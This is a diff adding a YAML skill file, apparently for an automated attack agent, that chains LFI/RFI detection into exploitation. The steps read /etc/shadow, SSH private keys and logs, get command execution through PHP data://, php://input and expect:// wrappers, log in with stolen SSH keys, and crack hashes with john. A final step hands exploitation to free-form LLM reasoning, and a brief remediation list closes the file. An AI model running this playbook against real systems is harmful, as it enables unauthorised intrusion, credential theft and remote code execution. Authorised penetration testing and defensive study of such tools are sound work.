@@ -1,0 +1,235 @@
+skill_id: lfi_rfi_exploit
+name: "本地/远程文件包含 (LFI/RFI)"
+category: web_rce
+phase: foothold
+version: "6.0"
+
+match:
+  rules:
+    - evidence_contains: ["file inclusion"]
+    - evidence_contains: ["LFI"]
+    - evidence_contains: ["path traversal"]
+    - evidence_contains: ["directory traversal"]
+    - cve_matches:
+        - "CVE-2021-41773"
+        - "CVE-2021-42013"
+    - fingerprint_contains: ["php"]
+      evidence_contains: ["include"]
+
+probes:
+  - id: detect_lfi
+    description: "三层策略探测 LFI: 绝对路径 -> 相对路径深度遍历 -> 编码绕过"
+    skip_if:
+      variable_present: "lfi_depth"
+    command: "bash {skill_dir}/scripts/detect_lfi.sh {ENDPOINT}"
+    timeout: 120
+    parse_rules:
+      - if_regex: "LFI_FOUND:(\\w+):(\\d+):absolute"
+        set: { lfi_confirmed: true, lfi_type: "absolute", lfi_param: "$1", lfi_depth: "0", lfi_style: "absolute" }
+      - if_regex: "LFI_FOUND:(\\w+):(\\d+):relative"
+        set: { lfi_confirmed: true, lfi_type: "param", lfi_param: "$1", lfi_depth: "$2", lfi_style: "relative" }
+      - if_regex: "LFI_FOUND:(\\w+):(\\d+):php_filter"
+        set: { lfi_confirmed: true, lfi_type: "filter", lfi_param: "$1", lfi_depth: "0", lfi_style: "php_filter" }
+      - if_regex: "LFI_PATH_FOUND:(.+?):(\\d+)"
+        set: { lfi_confirmed: true, lfi_type: "path", lfi_path: "$1", lfi_depth: "$2", lfi_style: "relative" }
+      - if_regex: "LFI_BYPASS_FOUND:(\\w+):(\\d+):(.+)"
+        set: { lfi_confirmed: true, lfi_type: "bypass", lfi_param: "$1", lfi_depth: "$2", lfi_bypass: "$3", lfi_style: "bypass" }
+      - if_regex: "LFI_MOUNT:(.+)"
+        set: { lfi_mount: "$1" }
+
+  - id: detect_blind_lfi
+    description: "Blind LFI 响应差异探测 -- 通过基准请求与目标请求的响应大小/状态码差异检测文件存在性"
+    skip_if:
+      variable_present: "lfi_confirmed"
+    depends_on:
+      any_of:
+        - variable_present: "LFI_NOT_FOUND"
+    command: "bash {skill_dir}/scripts/detect_blind_lfi.sh {ENDPOINT}"
+    timeout: 120
+    parse_rules:
+      - if_regex: "BLIND_LFI_HIT:(\\d+)"
+        set: { lfi_confirmed: true, lfi_type: "blind", lfi_param: "auto", lfi_depth: "0", lfi_style: "blind", blind_lfi_count: "$1" }
+
+  - id: detect_rfi
+    description: "RFI 远程文件包含探测 -- 测试 allow_url_include 是否开启，能否加载远程资源"
+    skip_if:
+      variable_present: "rfi_confirmed"
+    command: "bash {skill_dir}/scripts/detect_rfi.sh {ENDPOINT}"
+    timeout: 90
+    parse_rules:
+      - if_regex: "RFI_FOUND:(\\w+):(https?)"
+        set: { rfi_confirmed: true, rfi_scheme: "$2", rfi_param: "$1" }
+      - if_regex: "RFI_FOUND:(\\w+):(ftp)"
+        set: { rfi_confirmed: true, rfi_scheme: "$2", rfi_param: "$1", rfi_ftp_available: true }
+
+  - id: enumerate_files
+    description: "利用已确认的 LFI 读取高价值文件（密码、日志、密钥、配置）"
+    depends_on: { lfi_confirmed: true }
+    command: "bash {skill_dir}/scripts/enumerate_files.sh {ENDPOINT}"
+    timeout: 90
+    parse_rules:
+      - if_contains: ["READABLE:/var/log/auth.log"]
+        set: { auth_log_readable: true }
+      - if_contains: ["READABLE:/var/log/apache2/access.log"]
+        set: { apache_log_readable: true }
+      - if_contains: ["READABLE:/var/log/nginx/access.log"]
+        set: { nginx_log_readable: true }
+      - if_contains: ["USER_FILE_READABLE"]
+        set: { user_files_found: true }
+      - if_contains: ["READABLE:/proc/self/environ"]
+        set: { proc_environ_readable: true }
+      - if_contains: ["READABLE:/etc/shadow"]
+        set: { shadow_readable: true }
+      - if_contains: ["BEGIN RSA PRIVATE KEY", "BEGIN OPENSSH PRIVATE KEY"]
+        set: { ssh_key_found: true }
+
+exploit_paths:
+  - path_id: lfi_wrapper_rce
+    name: "PHP Wrapper 直接 RCE（data:// / php://input）"
+    priority: 1
+    conditions:
+      lfi_confirmed: true
+    steps:
+      - id: try_data_wrapper
+        description: "data:// wrapper 执行系统命令"
+        command: "bash {skill_dir}/scripts/exploit_wrapper_data.sh {ENDPOINT}"
+        timeout: 60
+        success_criteria:
+          stdout_regex: "uid=[0-9]+"
+        on_success: conclude_success
+        on_fail: try_input_wrapper
+        evidence_capture:
+          shell_type: "rce_data_wrapper"
+
+      - id: try_input_wrapper
+        description: "php://input POST 方式执行系统命令"
+        command: "bash {skill_dir}/scripts/exploit_wrapper_input.sh {ENDPOINT}"
+        timeout: 60
+        success_criteria:
+          stdout_regex: "uid=[0-9]+"
+        on_success: conclude_success
+        on_fail: try_expect_wrapper
+        evidence_capture:
+          shell_type: "rce_input_wrapper"
+
+      - id: try_expect_wrapper
+        description: "expect:// wrapper 直接命令执行（需 expect 扩展）"
+        command: "bash {skill_dir}/scripts/exploit_wrapper_expect.sh {ENDPOINT}"
+        timeout: 45
+        success_criteria:
+          stdout_regex: "uid=[0-9]+"
+        on_success: conclude_success
+        on_fail: try_phar_zip_wrapper
+        evidence_capture:
+          shell_type: "rce_expect_wrapper"
+
+      - id: try_phar_zip_wrapper
+        description: "phar:// / zip:// wrapper 利用（配合文件上传点 getshell）"
+        command: "bash {skill_dir}/scripts/exploit_wrapper_phar_zip.sh {ENDPOINT}"
+        timeout: 30
+        success_criteria:
+          stdout_contains: "PHAR_WRAPPER_AVAILABLE"
+        on_success: try_filter_chain_waf
+        on_fail: try_filter_chain_waf
+        evidence_capture:
+          shell_type: "info"
+          phar_available: stdout
+
+      - id: try_filter_chain_waf
+        description: "php://filter 高级链 -- zlib 压缩 + base64 绕过 WAF 读取文件"
+        command: "bash {skill_dir}/scripts/exploit_wrapper_filter_chain.sh {ENDPOINT}"
+        timeout: 60
+        success_criteria:
+          stdout_contains_any: ["FILTER_CHAIN_WAF_BYPASS", "FILTER_CHAIN_DEFLATE"]
+        on_success: next_path
+        on_fail: next_path
+        evidence_capture:
+          shell_type: "file_read"
+
+  - path_id: lfi_cred_reuse
+    name: "LFI 偷取凭据复用 (SSH 密钥登录 / shadow 破解)"
+    priority: 2
+    conditions:
+      lfi_confirmed: true
+    steps:
+      - id: ssh_key_login
+        description: "用 LFI 偷取的 SSH 私钥尝试登录目标"
+        command: "bash {skill_dir}/scripts/exploit_ssh_key_login.sh {ENDPOINT} {TARGET_IP}"
+        timeout: 90
+        success_criteria:
+          stdout_regex: "uid=[0-9]+"
+        on_success: conclude_success
+        on_fail: shadow_crack
+        evidence_capture:
+          shell_type: "rce"
+          current_user: stdout
+
+      - id: shadow_crack
+        description: "LFI 读取 /etc/shadow + john 破解 + SSH/su 登录"
+        command: "bash {skill_dir}/scripts/exploit_shadow_crack.sh {ENDPOINT} {TARGET_IP}"
+        timeout: 120
+        success_criteria:
+          stdout_regex: "uid=[0-9]+"
+        on_success: conclude_success
+        on_fail: next_path
+        evidence_capture:
+          shell_type: "rce"
+          current_user: stdout
+
+  - path_id: lfi_sensitive_read
+    name: "LFI 敏感文件深度读取（验证 + 批量敏感文件探测）"
+    priority: 3
+    conditions:
+      lfi_confirmed: true
+    steps:
+      - id: read_passwd_confirm
+        description: "验证目录遍历 -- 使用已确认参数和深度/风格读取 /etc/passwd"
+        command: "bash {skill_dir}/scripts/exploit_read_passwd.sh {ENDPOINT}"
+        timeout: 60
+        success_criteria:
+          stdout_regex: "^[a-z_][a-z0-9_-]*:x?:[0-9]+:[0-9]+:[^:]*:/(root|home|bin|sbin|usr|var|nonexistent)"
+        on_success: read_high_value_files
+        on_fail: next_path
+        evidence_capture:
+          shell_type: "file_read"
+
+      - id: read_high_value_files
+        description: "深度探测 -- 批量读取敏感文件（shadow/SSH密钥/日志/配置）+ 枚举用户文件"
+        command: "bash {skill_dir}/scripts/exploit_read_high_value.sh {ENDPOINT}"
+        timeout: 120
+        success_criteria:
+          stdout_not_empty: true
+        on_success: next_path
+        on_fail: next_path
+        evidence_capture:
+          shell_type: "file_read"
+
+  - path_id: php_filter_chain
+    name: "PHP Filter 链源码读取"
+    priority: 4
+    conditions:
+      lfi_confirmed: true
+    steps:
+      - id: php_filter
+        description: "用 php://filter 读取源码"
+        command: "bash {skill_dir}/scripts/exploit_php_filter.sh {ENDPOINT}"
+        timeout: 30
+        success_criteria:
+          stdout_contains_any: ["PHP_FILTER_OK", "<?php"]
+        on_success: next_path
+        on_fail: next_path
+        evidence_capture:
+          shell_type: "source_read"
+
+  - path_id: llm_freeform
+    name: "LLM 自由推理"
+    priority: 99
+    mode: react_freeform
+    max_rounds: 8
+
+remediation: |
+  1. 禁止用户输入直接用于 include/require
+  2. 使用白名单限制可包含的文件
+  3. 设置 open_basedir 限制文件访问范围
+  4. 关闭 allow_url_include
+  5. 关闭 allow_url_fopen（阻止 data:// / php://input 利用）
